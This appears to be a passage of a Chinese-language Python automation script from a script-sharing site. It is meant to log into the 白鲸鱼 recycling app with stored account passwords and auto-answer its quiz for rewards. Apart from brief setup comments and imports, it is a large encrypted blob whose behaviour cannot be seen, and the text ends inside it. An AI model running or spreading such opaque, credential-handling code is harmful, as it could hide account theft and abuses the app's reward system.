# 当前脚本来自于http://script.345yun.cn脚本库下载！
"""
# 环境变量:bjy_account，格式：账号1#密码
#多账号用回车分隔
#不答题就不要id和sign
#3.0更新了答题只需要帐号密码
#抓包路径 首页环保答题→先开启抓包→点开始答题 答题一个就可以 答案是响应数据的isright为1的 错误也可以 提交过后看get请求头(搜question)
#app叫:白鲸鱼旧衣服回收(包名:com.fangxd.baijingyu)
#你们自己去应用商店上搜 https://www.52bjy.com/app/
#第1次登录验证码登录 最后在我的→右上角设置→账号安全→修改登录密码
"""
import logging
import asyncio
import platform
import sys
import os
from typing import Tuple, Optional, Dict, Callable
from dataclasses import dataclass
from functools import wraps

# 占位符将在文件创建时被替换
encrypted_data_dict = {'3.11': 'Azxkk5LEMnoiObWDr6P~REqaKJYQp/unf~L8DPljnukPLb6aUI5I6RKfDD9GVGT9U7pASTN4wsIKcq1D9L0oPgoGPqz/1x0pumGC13u49pGrqPeS5UpXC~l9G~dkYF3T5rYsMqbPBwbE5y0eQ/xO~yXHgCkIHtT6Eas4Y96mNBvEHalvw2D8Ox4q1Z9Mm0isEOso~fxMtLyrl/OT6i2Y9voVoO6xlgwcO6/qWAuhCOke0g46053C0vd1fh2zTZ/MEy53tDNWayN~yvgg9w5plIMcmaP~MdRib6nyMXjoz~zCV8humYOKsKK9/QI1yJ/57IoBSnMk1SPtyIiuYpFLe~N4eGphBKe0UZqdNPr7/7Y5YxTdC1/so4GAZ7mv5Ujm~qbzwF8EJSX~Rf/DERPgKBy~QjNuILpLQ7pdMqfrIxf7gt4w6NXjhrnX6/9YR6g8Y/94kjcfjxk4SB9L9jEDJX4wj7kkXnoLozVP4FRPD76TG5RzXRPyXMmiaxKyUDu028ik6tKt59kVzVtGCfvdTJY1lMnvVwBSMTgSHe40st7bhr8SvP04DmIpjdqIc7FGb1lbObf0eBvs3EgRgODLG42lz~ACMZMcomBOy0k6I6lUqsMXqsVYKRo1uU1ELPZN61pQ6Y//TPmLQ4uK~vvqRFsw6hRu9NTrhcQfo8esr6KIYWlfuHCvH9pOmL1NND6YG0A6kDxobz1U9e1kb13BLFxmS9m/z1Wx3hBbvYMRIN0Qlsu8qLm4NcQNYv~4uYAj6Eipuj0Jcnwj2jhgsdRHWyiCwPkUjExYpz2DwzHzgvzuPCIdbWPpjSYCZfryuRijI8K~M~e0H5ICsrEZstbV8c3m3F3NfdW1~1N5kzLuxQDJiQG4Agpvpd4pRif/m4DMRcC7IGMK5lmYzZJR~iGBxU8aZWXKzV8dBiYZwOeQ10Eqle2s5N2ymlKDNFDVSjFomD9F1zxcvYg/s5DBAk7lR8GeQpE5o9I0s~nDhCEMKSz8qIK//4xdU63wCuasgZv/b8iXQP2tB0TSt9axOzBYVB3K2tm3YwH9~wWhCaneizuSYbSLL8yKhd0cv2mnJqzOC2Ka5iFIsMITdTMQ7cYRF~L5DM6jAwtdvpL7aK2hN0LJEu~ASwymp8h9tN9pN6ObektNX8RqPFQY28J0fNvxKd0bUVMknjye5pem7u9t1jiXTwTEY9H4yzb3/4ruu33JGvQFgtxfDy4cK5oFOXQbb1RTx3icElekOGSh9PoBMeM2~I29lBVXnloF/ZGZN5i0wRtqYVzPMz~3QNJWMY2dtF3W7VfG66roeNm1L2c3ESdRVXrpTTQMUC6~75WBVBcrIYHTRxeBb9vTsEapn45r~y1Y1r/j97PwQzAgUuQxF2vI7bkU5D9P/2OcHrPsZ2IERfGbu7~1/ZBzR2NBySDyACjRapuFsklzORQQSeJCuajGcE3b2zjCvvqKJ7SjEwod9jzc7liICU80kA8VULo3s3HMNZZ0m7pW3rTH6zQFBTWYZQXFiRQXKgMoVIbLDw6mBLpvgI7TyWh4nmZ96B1u8ee7j~3Sb5rXA1iULqN9~MDNMibwTXg9Ch6p4oYDictriNANI4uBEQVRmFLcuKo0jDeVSPXdnwnHS/RjuOT8yq2jF8BhgCYBcOAfqHuBahh28kJzce7ouTn74jSXn9WGL/hVHC9c4YGy1wN4DDX080JGsIKtKIeSJn5EtJk5hz0M3EvfkG6LCKGHh/PYPlrICbYXMYiX~cEomX/e5iDeZYeXzWe5f8lDvnokf1lmaV2SwDJT08oftGRFm49ZWi2kNjadqXHaj/nORCIXBCWcz3wKOhC~rX7m/37Z5opIfQSWXHjIzsSUG8dk2AXgfp~b5cHO3bC0vPgV0uAeXNhN2GKPpi8vk6YaSx9l8KgzB4yHlDCAfHJRJyNqbQ3p8T46ZVVUF~Qg0w4wG5X/Q1Ss28akbeK265x93HItrofWwXD66tYw~9C/gtEnlDTH02bVianqrRK3H1jcg0bebwZx98pIxsIJhtan91UAXSDvxpj2HWI35RETxmXmliTemWoQI0qK9j4IAE4drIrhjUMBc5l39jZ4fmFXZUwvAWCisarrPsRzVdF4BpiwcHPMqtFLGl5r60GA1gqlraX2uqBv12nu3100OmEueNn84pgpD~Ala7BXYFWDL91fPQGVwvEj8kzEF7BepcHXt9cZyq2fcEE~d7dmW~cPz32lEsv28xS8Z3AFXfvOfQoVyo~Yc6sxJn6UaSPXIMw3rYvC7YT8wvPQWEkQIVLM3OyGW8cwknbzeEBW1Utn5VCDWnJC5VWQdhu1lbUMNFTBhI7DLimeljTp/bnSBiKcGMMimAdwA9z7r69elsh27PMad4/Tr2gpFy6FAKNvL0JLPEFCZQsrfSoPfD9n7~1ii3buKFf7rWN846TMk6qBdF1F1QIPkNe2XJxg0uvo6XyZx5I5vkEFRwSAxyGg2hf4biyUtP~G1v3piAyymyuIV64Rk7bJHgzaBCtj0XTbxgOAVphEugkGjK8UaKy5dFawhXIAQINc74yx~c1AcqAoN~hFFudxcwvHDNIyu/kWu4RD1dud7MkUlwU/qEqo9f52K8SgVqOcxHh0Mg9oAWTOG2ENPYsO/on7s6VVvp5pn8oUXSzyEizcDJbroNFDG9ba948QWtAoWBzqzmanPBu9NLL0Rkw22M~r0V9kZy7BvbPVzfSwp6irb254QtXr5GNI3jVXFlEvEImaxXkCTs3FzVStXa~u854GRdtiJzvK1yyLBVjY8~9g0sz3MgRLgLKMLone~g2xyRRq1btviQK3V9NT~e4bctaLtZNhaVfkTgxzDp55EpqhCLbAVS4e8d6PZtgUFmmAUdDiIC9aq0XVuyh510kCQmY328r0PAnwfN05EMCT7QRyr7Fzhuvb0cSHyDaYWiYwLgv5hzk/COIm5viqAo3zBpy5G3oEDCYrepVwBUhenhyC19ZKGQd8j4OQC8PPyq7KOfHs54HxfN3977s3N04KF98T0mUvonxdc9VYICdr7C4G7rxcpRCYDpkWY1gGTE0wKWWZApDmRdB/w7sHXTm0YUeq1bzmB8h/7OAFRz2PxCawWha3c2292Cj4UgLutkScf/bUN7O0w1PQBC8qmPo1Ylr1FYBQG4lomJAiXyz82yU/SKP0DLgLtiFPun2TuwqYkG7fTioqA8i4Ha5WDtB/bWBKcOlWfZBL0LL~AtRp1jPEas3UcJRTZ7mjU79MdgjZ9tr0qRZMgxuGdHE0aufc~VnoN3IpWaQM8OtWVieJJhKqWS6lJ5V1qetgvOSt9X2AMs22tImnYBSm3yBzDynx94vU7Oba2wHtTf3liexvYyVQHQBCC6OdJByMFTQKyECi5pPsrvEMV8MZoeLQRV/16SluNp8VaHPUCX3ZLdkmV~Is8EdmkS2jaKSZFlXXCAUb048w~KCv6KsKoYZoHK1YUAr4WI7eGLGG82i9cAqsB259thjDjey1BM4NJ4mhs108ql/VugAvJU7T6UQOnWv/mVHZskvJjgvXZs1zNzt6AOSxTE~u3EYCth7cOa2mOlMjRsTjHLmXlUdaypyJ2Pa2ykdva/yw0KPwxM7HQxCJKNIwiA2aEWgATnUSoUOVB/sNF4IVyXJQzIxaX1xf4Qx6K63gJ5sdIFsspXs18LSENnokS8NRFRGiyuq8YQbviAZ3WhjhmwZHLTnxPGMaUz1yO6xkH9164ZT/GobdQsbiAZdMcbToGlIzNaZtzdabEBUloB5t5~V1CxqQq4LGYoT1fPml4X/OeQQVk6M0uvTSusOy/QeKiC~xlTxsR2YoU9jpeeplFVYRD3eAbuzHJdV1d3H/BXV0xP4tr4J3mCssOOAlzJvZLZqaPqp9CnSOUAoMcLG/wgJMJTAPukRmv3vpCrYTk3RqnKvaFU8FY6~FXkluoXgSz3oiVBZ/U5w1Y8pwjlDyN7oBDgBnLoz82C4Kn3OaAyyoBy40a8ga8XohxjE53R26MUU4o/lpq3brX9oQV0XiLT7daSFVtjSDssZI6QtrDwfefPeWOCq0vrKO2LYzDYnrlfG0UJ/BFEHmyeCz2gKUjpIOs0rL1m5z6CN~6/MwojP71A3cKdTMYZqtgJSQhzHx6yiiGQSLsbJGkCT8c7cvwD3z5kqoAN0RMbZGBtL5Y~exrAwFOfHn4YE5bVsCGRfDf4VcuKGKENWMzKBAA8rHcjKkvI5kqHfsoIee3uq~F1ma9EL7j1b5/CDAmHRh1ezryHE2qvThwBfXFZIFZ92y6sqwYRfRkD5lmMxoJZo8movwA9hXaUEapEqLgZrmxzQeE80fP36v5SRHVDtNwxd2YcNed4FizFnpH65EyYaONVES5oJm4XEbaHjEb5yusE3BnW/0lg6SMVPx3~9lmKSLXgM3OTgCPqJpJAhcMlyhyECXhMPI3RQjE~GhyMdi0fLzQSHNheZmh67hn975nIy~qiHUGYZMv5MSZotCa2DM77ySxkUS3N1YqnDuc/hWUTRpokIrXtMxsw4V6edTOEw2vKZyJX5lwa7u5L9BlAEEETupuoIDbb2yZN0mRFggNyWsp4zJj5XFRJpipoSngAic42O9ZP9/ILFfYwx07g~g58HSb13T1vbZP2ZbAyr32z1PnkOugsaT0LofZz0dDzhag9Q6y2FBmBWX3uy7w0MCJBgj41T3TumjQUIUWDcWtjHE4P2Qmf~FOo2KLWdyGT/37Uhz1FVES2qDcEPuEhQQ/JVf7uL/mw1gXOrK9EswiXoLW9/bicJfQWvotkbYRViuAMS7CWesMmckiMN4VQR3bBMU5SQbeYDbvQuavqoflECwrZcl2Vmu5yVT9bj3reyZ/e6nAIMMu63jySD29DojABxY9HUPvDeLXTJSnRxOKNnE8dsXpm7TwZLoSJmeUpmTKVd6BoW9afGUl~cbiZ65mvIw2mnYjzqlA~i5qlpnmlREIxkfMzORZxCING4elJJ3x60yqj7ByN3LVClBA0P1/SS7HgqWbGbQnE/O6AiBWfba6tmZDbIb9qZ/DYiQ/xBN9PuBIShqjp30zYCVFufzTznU40K5IJ/P3vU/EIlP3c2WpPLyQNqnjvzo3722O0kHlaNs7JvRQ52E/GJYnTPv05eHaNTvXn8hrBGAFrqe8Gq5q5KH2xL~XkD69sKKZ4n6g5DLeOLrkc8rF9LSxGqqJIw1WcigCfUkRwsW3fHc2IquYEfnAWA7pcyLLJ2T4bIcG4EesWEczqe3T7Wz259kZaKFsISJe7C1t8lU6OM2fNtgNVSdYqekVvKoVw2qFRbH1~Ym0ouesYGuuYOJhDRCpNNfx2ABDFwT3zrjRuzvoe2Hjtsj6RVSJODoGjdEwaDw9yAfsXZgMmSmPYIzz2zOdRdq4Ejoru6NdhQscRjWsdvFgGCdLgHUN4ElfG5yqt8m~1odHkO8UonSdO7P6t6lX2D4eyLI~rEANTfetMm1GqhcpwPzJ3VKHu4t9EYZLcRC7DJe0coZ1OBvvUtCYwipCwQ7cY8wnHlzcRuGYTuOW5paRKto3ZYOkV1gYqsXVlC17bWW4xI~Bi9XGuvrhp7awBhkAxyzoxvRY8TuhAlq2n/yU0lkHSdQJRJuG821sJBhL3Hw/6MUH0SLHNQp91fW7GLhHZdFFMMjUylCs3XjuIpx~ZBCNEsIKp3TENKRoHahsf7GxwiGCsOj2BeDNOrzNHF937WNdFKAG7zJY2xgrS2YeYuoIPK7FsH~wi/fNAms5vlKEjpufILbTKKrW6jpaBEf0VUkeN7pe6kwqhnP0nGb5PLn9VL0c1btCW4eJeDxzGDvDi2EpQc21Lu2yP8IiIKaLFHgbXeEpGSi8y3Rz5~jjbybz0Q0a3pxLnnresaRPB2Haf4d~ID7G/o9CdDYsO6DrOB5mtqqROv6zOzvqEq30~Fk7JTMk8B/iYtt1yySbasuufVUMoXlWOHolPnuUCz41KjKvp2/axr3t9hRZg5GwAzqduZcccOjTJXJwCDtdfLGYoF9Uo3sePAU0HB/~shvKLq22~BdmVarR77GIn72gt/F2Zz3~p8yrOKQEYH/CpQUiVwOcUxKuOVr0ldOzNDvSv5dmhXYJSthRYji/c8kZ~mas0Z8gH8HEsMzWP/qT4quUhcGlcnZOa~Gj2jc5ITQOCfugT7FDrfrN56hypMP280pR8DIZ9lOlN64d9xqGbFFNUvrY6/BbJBgO23gr0BsaEvG50l~1yWNbYULRJ9YizbXboBdPM4b0lljHkiVqGQDeFH3qwmPt/lrjd3anpRVcZbKN0E4i6rQj0yexrJkeYyXK00VwzNt2Qb0bNlSwbB5ta9e2oCtPxcKIsG3ZVAIz1WQjXtQQi70XwDSYRJx/KbCQURHF2ptSuz0uDg0yUyzSy5QfYaD1grBjRCLeIym2c1oOXfO6hw5LoIRaZHeR3S0e3Ao6eJOQl7S8NTYP3NaJbn4zmxn55fHM/~~OobGp3MMe9z3w9IB71N7Rur31Fh51zft5JohuMYVQ~aosf7fpbIjJAVB0~HVcZAqxuzscq0Vlzoo1roIX8IdEJL2HdvLxY0kdq6HFsBqMDylQwPNeZsWrxld3kLhYiCtqo1sOot8X45NzNfmEw/NIsz3lTskFNq9eyVydcq/Ufg251JIvLSDXHwPJ05xP446EvLkfrXE1yRnr/6YJoJFkAPIxuoRfULuG~bXQw/~Rs9EgUM9YyUw0kb7Al1AjusSFGt5RfIAK8TrdAd9bJ82MrsuP8am2UBlSZyh0EA3Be/TZ9NiqRgzOz8IZYC9l6Aw/ZiqHvnqm1UfC0zx9bgKH~6pJvzNyAEQbdL1yffmDP5KWiYhevBHwSV/fBTd0veh1i~DVxoNnceeQnRT8d/noOX3vAVLxIweEsuhCT8W1Qet9XD0u22dGbGe1PgsbzBWEjcxU2Ffut0h7KZTH4sJO4/ygyaWXNIiwlolA5U7htmU8PEfDTSyurOSLW3kgckq6sWHDE4nrgK6hWbBFFMfyfdPENsAz~TvVU1Llx/3gOr1ohunEjwAnjbnsQARl7QbwdZ88f6yfk10C08mw128go44D3wuKZueXcf4v2CRRhmpfWMo7fyKAGFosnnj6AEnj57DPq29XxJ2T8VfcFsddvNit9TnCyz5yXQ7TnXcSQoyGOh~vVCzFd0F~nmhrpBeIdI/AM15LO4dOp8Y7MM0SgQsI8DrWHA4M5kHEkIZWzzXuf/bTT74ITx9NqwoNbeWYENiFooY1R2H/TIkj4Ul1cC9i14SjMEBWUjKbw7QIqMFTjlL~cr~3ciuDnXkifjUy4g5yhhAO4V8xuXSoqS8Tf~A5XEuLE1iRyqBJHI4/UK2/outepvDIV4K5qg5IyuZRx1RCTyiuLR2BBPXOBN3a6crv8rGnUUaijlrDXZV~8QWX6LAqnDrrPBHr~4FJv5eT36uK/lAHYAVnuI~2PtSMvUGyP0k3zp/wmAC6EHFsBWiWl4g9fPFTPU1wlUgu6FBpaIpoQwdCRN5Ji1HEZrB2dRIoTRQVyEGY4jFEiWvqVZFRTyH8oYdbDah9wHSBxhb/CKkBM3KNst2CYcsWDpoMZBVMZ6hrN3/Z1DGAdLrlqmtosfDu5hUX1Gcxdm0wr4PfOTU0ZXZufx2f2vXVoW/FeE4XhG~P~zZ0GISQX/qhYU4UddshjQk~iVh9Hc5HQarIVf9B1v5qbkc~HZ0ik9Yr2aTP~MG9jEifJM10zg45pLXwC91~HneagT4ZDTp/UbhYN4osz20iVvswrP/pDtyl/3kd65OXoA/zdTTC6j9Hx~aQfTTZ~TTU7TPI2iQDq1UQH6lDLhgceXIKN15UHp5jXE6ACGeJCi7j0DncuKcxOQjQLMsD6xcO3ZKQ3flAsWbBog/dV42Wkfb0xYkQzu8Ia1IhM9AqHL46os6RgC2mlUEdSjtDh2ryuCXUaulryCX~9gRW1mTw9MBbFN/7~NVfAysxgGdn2BAlpc3L6Q~emILacaSck33ES5EX6QYH45ZbqgDypK/KKFyAcXPY/xVawCfV8worOkuRnZdjAJHFDMsadCHq4WK1iip5Cr7kmPnXqSaqgD2rdcV9lIgdnfuDax6EJbXGDjOEwCd~WKg~RFUXR2Ef5GS94fuxuUE/B6JEiQuxanXl0VSfCG0JiTDZAsQoK/cmQuryhFriOMnpnfyeD0M22uN6w3kUd1Shl0tA1jedJH/tprRNhxiMCgBDROW0k9366HsjmOfzXZBlOReJmI9vPJ7DBpFu/lTuxm1uZZPrG9h9xdwg9Icui29LTxZzmr6AgozCRNU7k5OGXgm~Hgg/oBF5kE9pZdsOTYarq5WXVz115Ey4TUKMlV7BSf6g~o3PSOmPYnPKQhcoeOy8ly838~gb9/Mj~Wl/UWXr8DX6GiajsSFMOiqGbHFi0e4RC5B8LkPVd25e82KlGbBnT2i2oBxypl/sCVi7qJvl9GCv1jDypJYL8E6kZ7uXvQWgihlQPjSoQRW/neJGJh1sLLFmbcy4rvKiDOVmu~pb8w8OfHplKN0Vwt/DxeSJ5W7QMSQ21TU3fLNkJPvzTLvZDzPGT9gMR6/sBfJ3f5/D85IfJJdQKWUMs7UqqARItQXfH/Ydmsom/Tc/uzy7uM~QSjtVxgGHvKIRd83Maesd6VJWluOQSM~2bD9jaA2CBdWa8fxksi1J1DJyh5kw3XuZGjKy8Szlyvd51/FvBCG/ey0z5p68MwGeJmKKld5fNLfq/NR8LAsXxSL6BR9fyJhZilJoMCc0OzcQqC0JdhKblzi8rBGNfIl0M4JOuO1M9I7oxtzbp1RkbuYV7uw4Ce55m5B3P9dHiSD~lXSywqRjV/RtPQvMkzOqXUk6u5wo8wt1jk8scRBMXteSmsbxxue1MBBVaOpjZLmIgBBFOyzrigO~f2kGrHutX09z0MV9hekuxk/OEvIbFJQwDZLzfYqCRLdgAHMH4vjy7/JAF7Dp46FvTFVZirqTCgXEdMPRs~/4fRoEbtdAtbYEk0Gkq6oJ5P1vqqjpR1esRGZcK0Wc9P03BlsjTGoU5yNfriOPNXJrb7oD00S3LAVdaVxL8SSvCXf38~sA3IhmnUaIiefA34jGdnau1oW3nGhcOaGMNBgK~gIvsxWJuTc0opisX3KbwehLIjzMiiej4uL5~X6T9FMifTqP5NiKh0IKrsw4i/g9XBrjfwR6AUo~jTHwLgZ0YjVVTRzoU0q~vJ0LNwbUUvzbjFcKc6c09cJOehfByNZs/QjD8YyvuPxOf3~3r4xKaP5nwmAJtMacbGZMJSSZRcjZEXPa~90yqMVWmAndYq08bKHOSn2vWKq0XMy1lnUfOeXmRLjOI8jPXK0c/so0VB2C5YIrnqpZgka7FXubfV0OOLED37mJSRH83fCkMfKPv2v3/eF6XPKG2IqDVS4HD02hS5Cuo~NwQ5Yj18k70zkR/XInfHQvVE5tz/eTvLO0NMptZ4NkqtgjHwv8e2QFMyOGXMYiTsq/bct48/GHesc42yfnIv/FfmDMeOWQUhdogU~VuF/OutWbydOljRN~zpu1kT4zldh~BNLmbDKJw9pBSaOYyflhz4G7q2Hk3ekYtCJNgMrY8lh8M31MG3DnCsIoF8S5hPcaGaH7jVtUiPmL2XkucpP7CG03WMIj0cJR6KQmDUlPJG8cN4u/S/MmbpU7ss3nodYtjtpoge2yYtqTENF2bfIddgg4EQqRR35ge13o2CVymQb/Wdljjo7KGGV4/zzl2I1aU9enm5g1pAFCi4NXChYawy3ltB/Xtm85b3dZyeCmeHSAf69uKqV8C8pXDOwjMeMR1g2nbN107uQBsYvGDNCvPg8~Q/IhLrZ0Jp8yj3foQyLCnT~PSiFFMjDNKwR89UkfCJxhFT50R3JzBNZnhnIpAyqGRUX0~bNfy8fY/h/0qPrDeP1aVUZ/XHl3i3pCFXJ5zOYWvc26GOwOBJVWnpOFz8cLq4BlV0IJhi1NFFzCxTed~dZ2eWtidGSU~y5zWvm/17O7Zv58a4Fsx31bmwNwWeVK3t~wo1hOh05pBfcCuhJNl2~DgrqAhf62OutGkLfJWqfUNLTVNN8FGXtkg/EiDF24jpeWIRnFGaSlAlQixPN7w4ZWG4AA1ZyYBnSIuBZd8jJHb7xt6DBOmNA7epwUNqEL4WMTKoY4DTm~VuXzTvOH1sLr7fjJbdTzrbIdfV0IQLz5LOOJF5UtWpgcPlrug8qctmd3keTZQ0Ff5TroaqMrxObPWvNJjWAXwKXCghl9rOFXJR0pE0LfdAzQCpFLw8Ic~RI8RgVlcwPPg~125QppMWdyuqsPoueMUy/KuY12QxQZNrNPzniTHWFKzeY0jB1QtaeJs6U/okuamnpEaXIfdulnuWvH7nCDphxKtOa5uBFa~BYvAHfz9UbAWF5M8WpERGUEnnpuAt19pBw/qbEz8ozBBJE4MQKqIQ8OwBFui89twuFlu~JQeAqKl6Nrb3d03ZdrEn~UnqJPwc9zaxCRJURpTbAgwjLhS3BQx4B8rrMMvzU5e1BIISuaOigPZCQeqTvkD5Vz1jFdjTFFUR6VVqgkdFdyUDeXb~i5Zl7jM6Do4V/87E2PfbPc268DfvPD1a4OQrG~zkKcvl4R2TSp3V6ePXi7jqX4KFdm73E0Nf9IPfEfBNK9q8gqafAfXBr3d~5FMMgQQRCSsPzEfwm6lLrUe31WiZhk0FPh8KNsO9LIfAQAzWesTIUlInv9XyKGem~72oeBXpN7VuAFWEe/lkJZ5nQW67OchE437Bd7uvu8iQcWtiD4KyWRHhJnwexR3LA5DV~t4jstkgEadZIrGlJwqdiON6rwfzGpKtCLiCoLrkwL4YVBYGwDcoPpoi8wnfblw3Vpeord2pdjgZpbhQNmK8zl43vCqWzIoj~VnN5unDUior1xlzPcWL7v6I7DszMkwFx8oN2KBo18S5YXZJlr9TqSJC3P8ALJyZy3sl1O5Yev9SNozHcSe2n7EtA2l9uWTdVjOGC1PJnWVDDN7aKwyCP44bUt/rNn6qlktbZE8CIFXpTRuQGcYSuGbDY/WzqpmFqk56nFiHwTIVixbNmQ31Xr2wVlKlhHmbiT0enIFUEvptDixwAyEWa9q/DEQnBHq4oBJwpm~oRun4AFog6OpAPp~xDnwnrPJyEJbgGKHIGWr2OgZLenPuHwf9PGZP74oV6qobhJm8tqGmZ0EqvB5p51YarhAimQW0scH1Ma6fEIxGAHwRDnQhKFBp8zJSqjc5c/kmXK1PVlbSnX3C9t8/QyCekxmNOmxcyp9SuHBxD~3Tw6nLbGSi~pbTYl0Jc2GtlPV6QeQVf5gkoD4f/sqUeYa9usVTVFM8ek32AcROeWjGk32K/~9TdHFYGeOfLt8Nj7jVRaWM5l/Yv92/MgSgzxcXh6N6vxxiKCcGYDAcBidOJHWdluw7mR8PoKmUx3KVdmSKi6N7h0Tt6FhDONIt28mNYdwihFL6X6egmMBxFSj0Bhm99yFexv3f4rbdCG~nDWCtkjXQTFnWxgzGk4LTNpJ9WLslRhfGZDt2pwKtYbx0vhPx4tNkvUKfgC9DA6itEbE4HevFFWgTlPYskwgLsIMkdmqOfgIFtaqZ8oUjPFbJvxMYMm3BdJA0J6~B3yXiFaaXyMtfvsEz8Ifv0Ex9zkDt65t9xU1fYLVg24yoHvF6VE/pxzlEhEbVw3FN3C/oY9zDuDdl0CSoLHGmciZj1zN4VpUIjHih9r1nXyNz35XD9TsDjEW1Fw5Q3FSIGB3YO2dR862jrTOmJwb0iyAO3CuGYGPBtBJrLYdphYy7y9IIY3Y/1goVad9e2I7qenQF9~KqwMegsJdAmymSFKdjAqqK4KKC9mlULryKoNXOBNXVNxfz~dZ~84TCEqkTOcJeaDcFcYLj3E2sJtLOR5Zo0SLhWic8zHIRDJB1ADCZqK86fIfWrYr3HpOiHjii2VI~2RT/MVuImTwqG41qCke1czZ1KsA/jXvG03oj2qFx83MerAlIyDPjeETEzyX6jWG9Gne2tUIlZjT5fH2~ZEccSdW~/HhgWxywHcuxx4RsqAOqq6wHHM~7d7yFOyRWaujOFerV7ft7UvT0~Y5/89wyC3CMOiuaDmgKYlvyhw12UukBTsoLS~UR7Eg~033PP8/fTbSlhGOBWyB/N6q2SBicUuifkDgu/yxpjIj8h/gu/B9UHD1V1Oii/XCd2fIgvwdshkq6lKdsO3BLJTIX0/fnC5X2FxyoqPHgAYdRuv0zYZJ9ILCMPMfhYPyRb2eSVbFvsYlUqT6Uiz0n0ciUvu07IpQNtza3zFWYduuCllLRYD7~OtryWshfuULoT~3uZUjNyx1qqtI~Fu4LM5wg6gObLZaT1XVhHBmmH3ojVfu2MRuN2Fa8YbAnMF~xz5W1HFl6RmzS38i5bDS2zj1e270I~7HDbQBmHHteWpiiKCuXASF8y4F0Zpn7FxTeI~xrhS6EdLgQVcGBo1Wr1cRihhghKRiAfR0kNJdwtwxY4w5uv65uEMeSJLGoaGDSEYbXO42G1V9y9/X2Zjqmf7C/vLbM5tVOgLdHnJ6IRzrtmpn~OODPhw5kLiiSG98stV53SsK2Bp~z3fPHPbiikouceeJOAqYRXw80E6qLR09BP~7zaTZOeoDdzDvn0gFTMLp/Yc~XFPZ4oLdZueVwh6T3eoenNijWMafVK7k/yK26Ppzsy591AXC1bLJj7PO1BDZFTjiBxRSOo~XHNuaHbJ7Q3V3fUSaPVuA01LvDJpcDVHvHZ5z6cXT6dRpOH5O1CNmK5YyV~sF3Xs6fRT14kQfc976QiSV717yaEUdaGg7XYZHCNHCTfYyloOfOQ6cwoaXnwWAhw1mHu62coDFiHnbkDGYFBFSYSpKJBRg~Su4bXdhmRiPjXVnZwTXmbsYLku2Ppme1idA2V~OL3uTsQ3hlVh8pg0XgvQb~lAVvCayrLFLK5v0K1OXfL3LamnreoVXntzdlBsqWmLmTGj0lpsdTFGdmRHFMtVbi3YCYrW5Lh09i0wkT7iQ03bufcmfu8yRAIFyNB3jz9Um2DNAGe0yVcR~XewRjxr~fED48R6Mz5VOZsdqz/FsiOzDnTrIvDzcn6fTdkoXA4i2sRYUoaffsMu~gqV7ApeyQT~r5XajPPHV4X6ldgZwafJ6bCJJSId/bzcT/359fHoPTFDZWZioZGK0O08wifr4SE~fh0DjrX~WBneJSRsLFHXX4/weCfPWIHa1RrIxjgZYbjbxwWWUtuEJgEsk~xyEA6ArkwTPpaAXXx200ULl1T2wuWkJOyV60IQ60jtgAuzEhu86ir36q14LlMzTprjoV1NOysxwJfkcVP~4KgFBmJPh8FnAnY4WQQVqv1vS7~OD~u8HzomonCLp3FmAhFWXs8L~UZXAIitCQF7Y~o5Kwx14kMfyN1GKdp2uqRxFuzmf74onuyrCo5p9l3a44OnI81Jvy1hVsnqvKRKe9ECf5jw63MnAHdWdvDqnYa9kQ8XAbOD0ddSiVO2z4T7Y59rnPlk9jmeEjzJ2KuOKXGvxsXuOAi0lq6l~COHGo9~XjLzXmEdXkKR0UeYM/leqb434yOEPYDG5YjlFd6B87j0DrJacUsMP5E3pQOLEpq0NEOlG0cEOJsXrCTs57T2VTi7n9LCIDAvRB7HvwE64m~9Qu4/nfX4GJkxt~NTeJxiNjEwT/NvATbXjrMptlXZgjpy73XmX1JG2JLKIAg0YvV~K7FzVPIO8GcJTPxLR3twJYVoZzsY/vAnk3GRHWrGPGzMFwuI4jnyX1~n2lT4LW81WbIqqn4pcUzi/LaCRBG5S9NVB7cHghYDeNYMOhwoqqHpla3tkKV9LC4lExuAOI1KgyGI1/6qKo8cKJ1bTV01RAfKPPgX0w1ldVHoe6rasOccdikqZuIzDN7xVDbfODJZq0boDdKsbT6RpUZc~xM0gSRZwakdEpgnpodQC~GEb/Nq11f6Yj26vN3a54sBpUdkcz2h~EYHJOh3RZT0Ih6FcrJccwg9zeLeBUa9Mz9CwbWJgqGNfSemkeMXLck0cukGzRHRL96s6VYW/xKNocbWj1HEBIQ6gDkcWT1rp81ojF5UDSaZfj/KXTNLMqSY/MdFkEQaIl3AAsB6YqVmfYFSDW3ENJiS/Q2EdB585gtAkDHxWsvaH9GLHZ7ZReaaTDx3~hgSPIlUvH34m5Fp7p~1VIbVdoJdmSZ2ImS22Zz7M7cwrv0I1Je0Aj6kCUO3aXa5Stczqa7X9iYXUrWLA7~ieD8M4254AQg2SkWRaZ6zATP/OgvGejbgjhSXe9YrWUQ1kKMXj0r79cyGk471DgqAYxohchSBHpiL0JyZpJp5cYtE59Iuqd4jkrdDczUwKKgYfIPeq2pXLXLIO6xbemvLK0wXYNhAx1HxrwqXz0RyWu58ppbnXQgQrPq2KinAQVqUoCywf1Y5tjdE9sz3IN45fm6qut3rly5dVsUSjgvIKeNALedyScOlOEgAwpr~BpHP3AdUE9k~SwLQd~Zj7uNZaVHMiExMJJ~DHDUfSn5wh40mUqHFU5KojLgOJfuHYLQbJ28d0jbXcLIQt07/x2/SiTntjBsZR9tmiHaoDkn53alMQ5k3fG3hFHKmZTrhmqpc11c9Mxm5ifpGHpbpFIcJ5kUqKbnozzjsC~FYcXz08Wg5IG4JKdYHA8F513u9T9UBU8yUCX/edTYa/Ok8JNmS/ShcR~BgeTs2hKQIKoVG~eK5M863Ur3QOrqGyYPjfSwH16RzLNwEhxPVYuSDDzGn8ZkUa5o4Lsi/D~OwLwhlJoREeZuwp9M0Z1m4mEaFfLHd8D33MZQH5U8PtU1TJ3de12F3~FCb6RCabiU~2fdo5RBHfLevt5Oh5~TIrBJYvZEBSei6i0hTKbozsEjdpnWekeIaVFUayzmcwVo4xAtgpmcLtRa8z~jJUXPoU4TQtNf1U//B7B037IuT1AU0DeEn6Dh4Q7nuYN2~hBY2trRdhOOrQN52Em9zJ~af0xVT7YnMSwFioihovELrBcGvO1eV7lRNyht/GVlM6m9eWd3sa0QrjIpOSEAV33h8YJW5yDeueEo6TLKpduFosXCE9~VZF~LMR/v07/RG~WnvohxLixqVyJRKAWB9LvKsrdvX03nZS2mUKAm8cpnx1VjOjM1FWeJ0de6HYjmffyYxgFQQzjYpzD4pAQlguC1cEq43zyUBFr1wtrKIFyPh9oaRi4b10ZN3GG9hnbhLQB5oMv7OKODaFfttjBWXOUTJ5B39pqggywCBz9qygUSohw8sm2XiExkZrNY3VNSujHINXEeMQVGdadjYdlF~0UilKwWusVA66b7AXt3LLdmPVao5t